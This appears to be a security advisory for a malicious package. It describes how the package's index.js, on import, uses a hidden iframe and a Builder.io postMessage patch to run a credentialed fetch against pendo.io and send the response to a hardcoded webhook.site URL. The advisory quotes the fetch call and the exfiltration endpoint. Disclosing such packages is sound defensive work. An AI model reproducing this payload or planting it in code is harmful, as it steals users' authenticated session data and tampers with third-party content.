summary: Browser-side credential exfiltration and third-party content tampering on module load
details: On load, index.js creates a hidden iframe pointing at pendo.io with Builder.io's frame-editing protocol enabled, then postMessages a `builder.patchUpdates` payload that overwrites `/bindings/show` on roughly 40 hardcoded Builder.io component IDs. The injected expression executes `fetch('https://novus-api.pendo.io/pendo/app',{credentials:'include'})` and POSTs the response body to `https://webhook.site/a446bcc1-d7ed-4e19-b3ba-d63821fa77ba`. Any application that bundles or imports this package and renders it in a browser session authenticated to pendo.io will leak that user's session-bound API response to the attacker-controlled webhook, and will silently mutate third-party Builder.io/Pendo content using the victim's credentials. The package's self-description as a 'security research PoC' does not change the installer impact: the payload runs automatically on import and targets real third-party infrastructure with hardcoded IDs and a hardcoded exfil endpoint.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
